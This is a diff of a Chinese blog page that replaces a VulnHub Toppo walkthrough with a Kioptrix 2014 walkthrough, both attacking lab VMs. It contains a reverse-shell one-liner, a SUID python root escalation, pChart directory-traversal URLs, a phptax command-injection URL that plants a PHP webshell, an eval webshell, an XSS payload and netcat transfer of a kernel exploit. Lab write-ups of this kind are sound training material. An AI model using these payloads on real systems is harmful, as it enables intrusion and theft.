@@ -17,19 +17,19 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
   <meta name="theme-color" content="#f9fafb">
-  <title>WP：Toppo - bug_001</title>
+  <title>WP：Kioptrix 2014 (#5) - bug_001</title>
 
   
-    <meta name="description" content="前提 kali ip 192.168.129.152  靶机 NAT 模式 信息收集检测ipnmap -sP 192.168.129.0&#x2F;24   ip 是192.168.129.165 检测端口nmap -sT -sV -Pn 192.168.129.165 -p- -A 扫的太慢了的话，换这个nmap -sS -sV  -Pn 192.168.129.165 -p- -A -sS 就">
+    <meta name="description" content="前提kali ip 192.168.129.152信息收集ip收集nmap -sP 192.168.129.0&#x2F;24  端口收集nmap -sT -sV -Pn -v 192.168.129.164 -p- -A  扫描到 22，80，8080， 但是22端口关闭了 看看udp 端口 nmap -sU -p- 192.168.129.164  无 渗透测试80端口 检查源代码  访问">
 <meta property="og:type" content="website">
-<meta property="og:title" content="Toppo">
-<meta property="og:url" content="https://cbbzx12.github.io/wiki/WP/Windows%E6%8F%90%E6%9D%83/vulnhub/Toppo/">
+<meta property="og:title" content="Kioptrix 2014 (#5)">
+<meta property="og:url" content="https://cbbzx12.github.io/wiki/WP/vulnhub/Kioptrix%202014%20(#5)/">
 <meta property="og:site_name" content="bug_001">
-<meta property="og:description" content="前提 kali ip 192.168.129.152  靶机 NAT 模式 信息收集检测ipnmap -sP 192.168.129.0&#x2F;24   ip 是192.168.129.165 检测端口nmap -sT -sV -Pn 192.168.129.165 -p- -A 扫的太慢了的话，换这个nmap -sS -sV  -Pn 192.168.129.165 -p- -A -sS 就">
+<meta property="og:description" content="前提kali ip 192.168.129.152信息收集ip收集nmap -sP 192.168.129.0&#x2F;24  端口收集nmap -sT -sV -Pn -v 192.168.129.164 -p- -A  扫描到 22，80，8080， 但是22端口关闭了 看看udp 端口 nmap -sU -p- 192.168.129.164  无 渗透测试80端口 检查源代码  访问">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://cbbzx12.github.io/images/head.jpg">
-<meta property="article:published_time" content="2025-12-23T13:01:43.163Z">
-<meta property="article:modified_time" content="2025-12-23T13:01:43.163Z">
+<meta property="article:published_time" content="2025-12-24T11:20:32.069Z">
+<meta property="article:modified_time" content="2025-12-24T11:20:32.069Z">
 <meta property="article:author" content="bug_001">
 <meta property="article:tag" content="WP">
 <meta name="twitter:card" content="summary">
@@ -49,7 +49,7 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"Website","@id":"https://cbbzx12.github.io/wiki/WP/Windows%E6%8F%90%E6%9D%83/vulnhub/Toppo/","author":{"@type":"Person","name":"bug_001","sameAs":[],"image":"/images/head.jpg"},"name":"Toppo","description":"前提 kali ip 192.168.129.152  靶机 NAT 模式\n信息收集检测ipnmap -sP 192.168.129.0&#x2F;24 \n\nip 是192.168.129.165\n检测端口nmap -sT -sV -Pn 192.168.129.165 -p- -A\n扫的太慢了的话，换这个nmap -sS -sV  -Pn 192.168.129.165 -p- -A\n-s...","url":"https://cbbzx12.github.io/wiki/WP/Windows%E6%8F%90%E6%9D%83/vulnhub/Toppo/"}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"Website","@id":"https://cbbzx12.github.io/wiki/WP/vulnhub/Kioptrix%202014%20(#5)/","author":{"@type":"Person","name":"bug_001","sameAs":[],"image":"/images/head.jpg"},"name":"Kioptrix 2014 (#5)","description":"前提kali ip 192.168.129.152信息收集ip收集nmap -sP 192.168.129.0&#x2F;24\n\n端口收集nmap -sT -sV -Pn -v 192.168.129.164 -p- -A\n\n扫描到 22，80，8080， 但是22端口关闭了\n看看udp 端口\nnmap -sU -p- 192.168.129.164\n\n无\n渗透测试80端口\n检查源代码\n\n访...","url":"https://cbbzx12.github.io/wiki/WP/vulnhub/Kioptrix%202014%20(#5)/"}</script>
   
 <!-- hexo injector head_end start -->
 <style>
@@ -138,62 +138,87 @@
     <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
 
   <span class="sep"></span>
-  <a class="cap breadcrumb" href="/wiki/WP/Windows%E6%8F%90%E6%9D%83/vulnhub/Toppo/">Toppo</a>
+  <a class="cap breadcrumb" href="/wiki/WP/vulnhub/Kioptrix%202014%20(#5)/">Kioptrix 2014 (#5)</a>
   </div>
-<div class="flex-row" id="post-meta"><span class="text created">更新于：<time datetime="2025-12-23T13:01:43.163Z">2025-12-23</time></span></div></div></div>
+<div class="flex-row" id="post-meta"><span class="text created">更新于：<time datetime="2025-12-24T11:20:32.069Z">2025-12-24</time></span></div></div></div>
     
     <div class="bottom only-title">
       
       <div class="text-area">
-        <h1 class="text title"><span>Toppo</span></h1>
+        <h1 class="text title"><span>Kioptrix 2014 (#5)</span></h1>
         
       </div>
     </div>
     
   </div>
-  </div><article class="md-text content"><p>前提 kali ip 192.168.129.152  靶机 NAT 模式</p>
-<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="检测ip"><a href="#检测ip" class="headerlink" title="检测ip"></a>检测ip</h2><p>nmap -sP 192.168.129.0&#x2F;24 </p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763715409316-6b25fc1b-fcdd-472e-9c92-b9502ce201b8.png"></p>
-<p>ip 是192.168.129.165</p>
-<h2 id="检测端口"><a href="#检测端口" class="headerlink" title="检测端口"></a>检测端口</h2><p>nmap -sT -sV -Pn 192.168.129.165 -p- -A</p>
-<p>扫的太慢了的话，换这个nmap -sS -sV  -Pn 192.168.129.165 -p- -A</p>
-<p>-sS 就是 TCP SYN 半连接扫描</p>
-<p> <img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763715503733-e2b4a6e1-b8f7-4f73-b5bd-00a6568ff420.png"></p>
-<p>22,80,111端口开放</p>
-<h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><p>先看比较重要的80端口</p>
-<h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p>服务器是Apache 2.4.10</p>
-<p>博客是start Bootstrap 搭建的</p>
-<h3 id="搜索Apache历史漏洞"><a href="#搜索Apache历史漏洞" class="headerlink" title="搜索Apache历史漏洞"></a>搜索Apache历史漏洞</h3><p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763713087182-d9b19587-742a-425f-b637-281a6c903a81.png"></p>
-<p>这有点多了，ehole检测一下指纹信息，缩小选项</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763716017634-873810f4-606e-410f-b70f-49cc1db0248d.png"></p>
-<p>缩小不了，先看只有Apache的，</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763716192012-b45e5085-6978-4502-9351-d182924a194d.png"></p>
-<p>貌似失败了</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763716695461-8121b8c3-a92b-4d83-bc5b-b4f37ef906b0.png"></p>
-<h3 id="searchsploit-Bootstrap"><a href="#searchsploit-Bootstrap" class="headerlink" title="searchsploit Bootstrap"></a>searchsploit Bootstrap</h3><p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763716764109-f084fb9d-424f-42d7-9375-90c41db7ed80.png"></p>
-<p>只有xss，貌似不能getshell</p>
-<h3 id="目录扫描一波"><a href="#目录扫描一波" class="headerlink" title="目录扫描一波"></a>目录扫描一波</h3><p>python dirsearch.py -u <a target="_blank" rel="noopener" href="http://192.168.129.165/">http://192.168.129.165/</a></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763718009494-beade9d3-30ba-41d1-9dea-af9010dbec4e.png"></p>
-<h4 id="有个-admin目录，查看一下"><a href="#有个-admin目录，查看一下" class="headerlink" title="有个&#x2F;admin目录，查看一下"></a>有个&#x2F;admin目录，查看一下</h4><p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763718041930-398317da-058e-462a-9431-343fb726c5fb.png"></p>
-<h4 id="查看notes-txt"><a href="#查看notes-txt" class="headerlink" title="查看notes.txt"></a>查看notes.txt</h4><p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763718091902-0a79429d-3377-4479-becb-7319069d7fee.png"></p>
-<h4 id="有一个密码，然后尝试访问一下，看有没有登陆处"><a href="#有一个密码，然后尝试访问一下，看有没有登陆处" class="headerlink" title="有一个密码，然后尝试访问一下，看有没有登陆处"></a>有一个密码，然后尝试访问一下，看有没有登陆处</h4><h4 id="mail里什么都没有"><a href="#mail里什么都没有" class="headerlink" title="mail里什么都没有"></a>mail里什么都没有</h4><p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763718219903-3cadb560-e257-4a54-abb5-70c4d15e3db4.png"></p>
-<h4 id="http-192-168-129-165-vendor-这个好像是个目录-目录穿越失败"><a href="#http-192-168-129-165-vendor-这个好像是个目录-目录穿越失败" class="headerlink" title="http://192.168.129.165/vendor/  这个好像是个目录,目录穿越失败"></a><a target="_blank" rel="noopener" href="http://192.168.129.165/vendor/">http://192.168.129.165/vendor/</a>  这个好像是个目录,目录穿越失败</h4><p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763718390584-0a255ab8-69a7-4823-81b1-3706e80c74be.png"></p>
-<h4 id="http-192-168-129-165-manual-en-index-html"><a href="#http-192-168-129-165-manual-en-index-html" class="headerlink" title="http://192.168.129.165/manual/en/index.html"></a><a target="_blank" rel="noopener" href="http://192.168.129.165/manual/en/index.html">http://192.168.129.165/manual/en/index.html</a></h4><p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763718722942-e3261aec-8a76-4a3e-86ae-fda8600476f5.png"></p>
-<h4 id="ok-网页端没有登陆界面"><a href="#ok-网页端没有登陆界面" class="headerlink" title="ok,网页端没有登陆界面"></a>ok,网页端没有登陆界面</h4><h2 id="111端口"><a href="#111端口" class="headerlink" title="111端口"></a>111端口</h2><h3 id="searchsploit-rpcbind"><a href="#searchsploit-rpcbind" class="headerlink" title="searchsploit rpcbind"></a>searchsploit rpcbind</h3><p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763717238000-db530bf3-36c0-4ec7-8fb6-4d2dc7cc4e31.png"></p>
-<p>好像都是dos攻击</p>
-<h2 id="没想到还有一个ssh登录，尝试一下"><a href="#没想到还有一个ssh登录，尝试一下" class="headerlink" title="没想到还有一个ssh登录，尝试一下"></a>没想到还有一个ssh登录，尝试一下</h2><h3 id="密码是12345ted123，账号可能是ted"><a href="#密码是12345ted123，账号可能是ted" class="headerlink" title="密码是12345ted123，账号可能是ted"></a>密码是12345ted123，账号可能是ted</h3><h3 id="尝试登陆"><a href="#尝试登陆" class="headerlink" title="尝试登陆"></a>尝试登陆</h3><p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763719735678-0ddc4cb8-a3d0-4c4a-b5b6-ec0f4ddd9628.png"></p>
-<p>登陆成功</p>
-<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763719833839-61d45f2d-b369-4186-bfaa-f3b0783386d9.png"></p>
-<h2 id="这个就不用反弹shell了，当然，愿意的话也可以"><a href="#这个就不用反弹shell了，当然，愿意的话也可以" class="headerlink" title="这个就不用反弹shell了，当然，愿意的话也可以"></a>这个就不用反弹shell了，当然，愿意的话也可以</h2><p>sh -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.129.152&#x2F;5555 0&gt;&amp;1</p>
-<h2 id="尝试sudo提权"><a href="#尝试sudo提权" class="headerlink" title="尝试sudo提权"></a>尝试sudo提权</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763720459961-0b8ab679-ca5e-4cc0-b0f6-e981e63fe4e4.png"></p>
-<h3 id="查看-etc-passwd"><a href="#查看-etc-passwd" class="headerlink" title="查看&#x2F;etc&#x2F;passwd"></a>查看&#x2F;etc&#x2F;passwd</h3><p>只有一个用户</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763720589533-db3aad55-7ce9-4be4-8bd4-64d619bbc217.png"></p>
-<h2 id="suid尝试"><a href="#suid尝试" class="headerlink" title="suid尝试"></a>suid尝试</h2><h3 id="查看是否有特权文件"><a href="#查看是否有特权文件" class="headerlink" title="查看是否有特权文件"></a>查看是否有特权文件</h3><p><font style="color:rgb(0, 0, 0);">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</font></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763721302751-c30517b4-f1c7-4247-b0a3-60ad749fd57b.png"></p>
-<h3 id="尝试python2-7提权"><a href="#尝试python2-7提权" class="headerlink" title="尝试python2.7提权"></a>尝试python2.7提权</h3><p>&#x2F;usr&#x2F;bin&#x2F;python2.7 -c ‘import os; os.setuid(0); os.system(“&#x2F;bin&#x2F;bash”)’</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763721350696-80803f75-5771-4568-a440-790d1be4186b.png"></p>
-<p><font style="color:rgb(0, 0, 0);"></font></p>
-<p><font style="color:rgb(0, 0, 0);"></font></p>
+  </div><article class="md-text content"><h1 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h1><h2 id="kali-ip-192-168-129-152"><a href="#kali-ip-192-168-129-152" class="headerlink" title="kali ip 192.168.129.152"></a>kali ip 192.168.129.152</h2><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="ip收集"><a href="#ip收集" class="headerlink" title="ip收集"></a>ip收集</h2><p>nmap -sP 192.168.129.0&#x2F;24</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763025960422-e0d447cd-e74c-480a-8494-a8d403e96ab7.png"></p>
+<h2 id="端口收集"><a href="#端口收集" class="headerlink" title="端口收集"></a>端口收集</h2><p>nmap -sT -sV -Pn -v 192.168.129.164 -p- -A</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763026058631-a5662a8a-40db-41e8-bb6b-132523e034c8.png"></p>
+<p>扫描到 22，80，8080， 但是22端口关闭了</p>
+<p>看看udp 端口</p>
+<p>nmap -sU -p- 192.168.129.164</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763027522460-1e7cfc4e-3434-4ff6-b6bf-dae4e5c13120.png"></p>
+<p>无</p>
+<h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763027674127-ed437540-ce0f-4bb8-a88f-9b5b0e17dfbd.png"></p>
+<p>检查源代码</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763027694445-2d654da4-98c4-4ff3-8540-f520f28752e1.png"></p>
+<p>访问</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763027728934-c688d0f1-46b4-4cc5-bbcd-87809b335ea2.png"></p>
+<h3 id="ehole扫描指纹"><a href="#ehole扫描指纹" class="headerlink" title="ehole扫描指纹"></a>ehole扫描指纹</h3><p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763028337805-260b6090-40f6-45f8-b180-3ecef13cc14b.png"></p>
+<p> Apache,FreeBSD,mod_ssl,mod_dav, | Apache&#x2F;2.2.21 (FreeBSD) mod_ssl&#x2F;2.2.21 OpenSSL&#x2F;0.9.8q DAV&#x2F;2 PHP&#x2F;5.3.8</p>
+<h3 id="扫秒是否有漏洞"><a href="#扫秒是否有漏洞" class="headerlink" title="扫秒是否有漏洞"></a>扫秒是否有漏洞</h3><p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763556429502-413fc7a8-38a3-4e56-8574-1cceb40329c8.png"></p>
+<h3 id="查看内容"><a href="#查看内容" class="headerlink" title="查看内容"></a>查看内容</h3><h4 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h4><p><a target="_blank" rel="noopener" href="http://192.168.129.164/pChart2.1.3/examples/index.php?Action=View&Script=/../../etc/passwd">http://192.168.129.164/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fetc/passwd</a></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763556786738-350de685-053c-491d-8a95-20ef1a2c5449.png"></p>
+<p>有三个用户，但都不能登录，尝试内核漏洞</p>
+<p>&#x2F;etc&#x2F;shadow  没有权限</p>
+<h4 id="可以查看apache的配置"><a href="#可以查看apache的配置" class="headerlink" title="可以查看apache的配置"></a>可以查看<font style="color:rgb(49, 70, 89);">apache的配置</font></h4><p><a target="_blank" rel="noopener" href="http://192.168.129.164/pChart2.1.3/examples/index.php?Action=View&Script=/../../usr/local/etc/apache22/httpd.conf">http://192.168.129.164/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf</a></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763557470890-e970a965-4e4b-4bed-a748-c7296eb73cef.png"></p>
+<p>只允许<font style="color:rgb(0, 0, 0);">Mozilla4_browser</font></p>
+<p><font style="color:rgb(0, 0, 0);">替换一下</font></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763559279561-65e429fc-2278-4b90-b234-8d9485ab88d6.png"></p>
+<p>使用这个插件，自定义 User-Agent :Mozilla&#x2F;4.0</p>
+<p>但是感觉不太好用，默认的话，浏览器不能用</p>
+<p>还是用BP吧</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763624817933-28c60f6c-7c4f-40d9-ad56-fb5cbf591677.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763559382009-ecf21ba2-b63f-472e-bbe7-d38ec8b8a6d9.png"></p>
+<p>搜一下是什么，大概是cms</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763559654902-e600c196-46e5-4139-aa21-9c9cab494c55.png"></p>
+<p>有msf模块，直接用</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763609041493-b004b02a-edc6-49a9-a5d4-45ffb227c706.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763609306339-be0cda40-1a02-48af-9aa8-1b430aaed13b.png"></p>
+<p>失败</p>
+<p>翻看别人笔记，原来是没有设置payload</p>
+<p>最重要的一点，没有设置ua</p>
+<p>show advanced 可以查看详细内容</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763615210120-f6a9c899-5d94-4a78-971a-6044d7abfed7.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763615239904-30c81f0d-b52a-44b4-9a20-9d0460312bd2.png"></p>
+<h4 id="手工尝试"><a href="#手工尝试" class="headerlink" title="手工尝试"></a>手工尝试</h4><p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763621958089-dbb62dcf-05d2-4bdc-9b65-f764a617dcbf.png"></p>
+<p>exploitdb 显示 可以有两个方法</p>
+<p>尝试输入一句话木马</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.129.164:8080/phptax/drawimage.php?pfilez=xxx;echo%20%27%3C?php%20echo%20system($_GET%5B%22cmd%22%5D)%20?%3E%27%20%3E%202.php;&pdf=make">http://192.168.129.164:8080/phptax/drawimage.php?pfilez=xxx;echo%20%27%3C?php%20echo%20system($_GET[%22cmd%22])%20?%3E%27%20%3E%202.php;&amp;pdf&#x3D;make</a></p>
+<p>看看成功没有</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763624891952-2e8327df-8567-44d4-ba5b-0a06f648bc89.png"></p>
+<p>可以执行命令了，不知道为什么，连接蚁剑连不上</p>
+<h4 id="蚁剑连不上原因-得用适用合适的一句话木马"><a href="#蚁剑连不上原因-得用适用合适的一句话木马" class="headerlink" title="蚁剑连不上原因:得用适用合适的一句话木马"></a>蚁剑连不上原因:得用适用合适的一句话木马<?php @eval($_POST['pass']);?></h4><p>这样才能连上</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763627209335-105b87ba-2203-4e0b-b973-e8e560e7dba0.png"></p>
+<h4 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h4><p><a target="_blank" rel="noopener" href="http://192.168.129.164/pChart2.1.3/examples/sandbox/script/session.php?%3Cscript%3Ealert(%27XSS%27)%3C/script%3E">http://192.168.129.164/pChart2.1.3/examples/sandbox/script/session.php?%3Cscript%3Ealert(%27XSS%27)%3C/script%3E</a></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763556908300-768e30f5-c3da-4138-82f6-5d610c73468c.png"></p>
+<p>但对提权作用不大</p>
+<h2 id="8080端口"><a href="#8080端口" class="headerlink" title="8080端口"></a>8080端口</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763027790816-d76172ec-8b92-4c45-a278-ba51dda4bb19.png"></p>
+<p>禁止访问</p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="搜索漏洞"><a href="#搜索漏洞" class="headerlink" title="搜索漏洞"></a>搜索漏洞</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763628686002-e0819007-c4c8-4aa2-97f6-e1af7f8709a3.png"></p>
+<h3 id="searchsploit-FreeBSD-9-0"><a href="#searchsploit-FreeBSD-9-0" class="headerlink" title="searchsploit  FreeBSD 9.0"></a>searchsploit  FreeBSD 9.0</h3><p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763628721450-d4ecbbd5-4a6b-454f-80ca-a01c58166c8f.png"></p>
+<p>28718.c没有成功，尝试263这个</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763628735785-06122852-8a8e-4834-91d7-5ac5621a1ea8.png"></p>
+<p>系统里只有nc 和gcc</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763628867886-3d787040-9177-4fd8-b304-6c3a0330540d.png"></p>
+<h3 id="kali-发送文件-nc-lvp-5555"><a href="#kali-发送文件-nc-lvp-5555" class="headerlink" title="kali 发送文件 nc -lvp 5555&lt;26368.c"></a>kali 发送文件 nc -lvp 5555&lt;26368.c</h3><h3 id="客户机接受文件-nc-192-168-129-152-5555-111-c"><a href="#客户机接受文件-nc-192-168-129-152-5555-111-c" class="headerlink" title="客户机接受文件 nc 192.168.129.152 5555 &gt;111.c"></a>客户机接受文件 nc 192.168.129.152 5555 &gt;111.c</h3><h3 id="编译，执行"><a href="#编译，执行" class="headerlink" title="编译，执行"></a>编译，执行</h3><p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763628979178-aca1375b-4989-49c6-a93a-551af558036f.png"></p>
+<h1 id="获取信息"><a href="#获取信息" class="headerlink" title="获取信息"></a>获取信息</h1><p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763629050008-9759b2ec-2a65-4eba-8194-b6ba9ef2cc0a.png"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
+<li>第一次用searchsploit 不太熟练，还得多用，英文还得好好看</li>
+<li>中国蚁剑连接问题 ：得用相应木马，不然连不上蚁剑</li>
+</ol>
 </article>
 <div class="article-footer">
 
@@ -211,7 +236,7 @@
 
 
 
-<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A3%80%E6%B5%8Bip"><span class="toc-text">检测ip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E7%AB%AF%E5%8F%A3"><span class="toc-text">检测端口</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-text">渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#80%E7%AB%AF%E5%8F%A3"><span class="toc-text">80端口</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2Apache%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E"><span class="toc-text">搜索Apache历史漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#searchsploit-Bootstrap"><span class="toc-text">searchsploit Bootstrap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E4%B8%80%E6%B3%A2"><span class="toc-text">目录扫描一波</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%89%E4%B8%AA-admin%E7%9B%AE%E5%BD%95%EF%BC%8C%E6%9F%A5%E7%9C%8B%E4%B8%80%E4%B8%8B"><span class="toc-text">有个&#x2F;admin目录，查看一下</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Bnotes-txt"><span class="toc-text">查看notes.txt</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%89%E4%B8%80%E4%B8%AA%E5%AF%86%E7%A0%81%EF%BC%8C%E7%84%B6%E5%90%8E%E5%B0%9D%E8%AF%95%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%8B%EF%BC%8C%E7%9C%8B%E6%9C%89%E6%B2%A1%E6%9C%89%E7%99%BB%E9%99%86%E5%A4%84"><span class="toc-text">有一个密码，然后尝试访问一下，看有没有登陆处</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mail%E9%87%8C%E4%BB%80%E4%B9%88%E9%83%BD%E6%B2%A1%E6%9C%89"><span class="toc-text">mail里什么都没有</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#http-192-168-129-165-vendor-%E8%BF%99%E4%B8%AA%E5%A5%BD%E5%83%8F%E6%98%AF%E4%B8%AA%E7%9B%AE%E5%BD%95-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E5%A4%B1%E8%B4%A5"><span class="toc-text">http:&#x2F;&#x2F;192.168.129.165&#x2F;vendor&#x2F;  这个好像是个目录,目录穿越失败</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#http-192-168-129-165-manual-en-index-html"><span class="toc-text">http:&#x2F;&#x2F;192.168.129.165&#x2F;manual&#x2F;en&#x2F;index.html</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ok-%E7%BD%91%E9%A1%B5%E7%AB%AF%E6%B2%A1%E6%9C%89%E7%99%BB%E9%99%86%E7%95%8C%E9%9D%A2"><span class="toc-text">ok,网页端没有登陆界面</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#111%E7%AB%AF%E5%8F%A3"><span class="toc-text">111端口</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#searchsploit-rpcbind"><span class="toc-text">searchsploit rpcbind</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B2%A1%E6%83%B3%E5%88%B0%E8%BF%98%E6%9C%89%E4%B8%80%E4%B8%AAssh%E7%99%BB%E5%BD%95%EF%BC%8C%E5%B0%9D%E8%AF%95%E4%B8%80%E4%B8%8B"><span class="toc-text">没想到还有一个ssh登录，尝试一下</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E6%98%AF12345ted123%EF%BC%8C%E8%B4%A6%E5%8F%B7%E5%8F%AF%E8%83%BD%E6%98%AFted"><span class="toc-text">密码是12345ted123，账号可能是ted</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E7%99%BB%E9%99%86"><span class="toc-text">尝试登陆</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%99%E4%B8%AA%E5%B0%B1%E4%B8%8D%E7%94%A8%E5%8F%8D%E5%BC%B9shell%E4%BA%86%EF%BC%8C%E5%BD%93%E7%84%B6%EF%BC%8C%E6%84%BF%E6%84%8F%E7%9A%84%E8%AF%9D%E4%B9%9F%E5%8F%AF%E4%BB%A5"><span class="toc-text">这个就不用反弹shell了，当然，愿意的话也可以</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95sudo%E6%8F%90%E6%9D%83"><span class="toc-text">尝试sudo提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B-etc-passwd"><span class="toc-text">查看&#x2F;etc&#x2F;passwd</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#suid%E5%B0%9D%E8%AF%95"><span 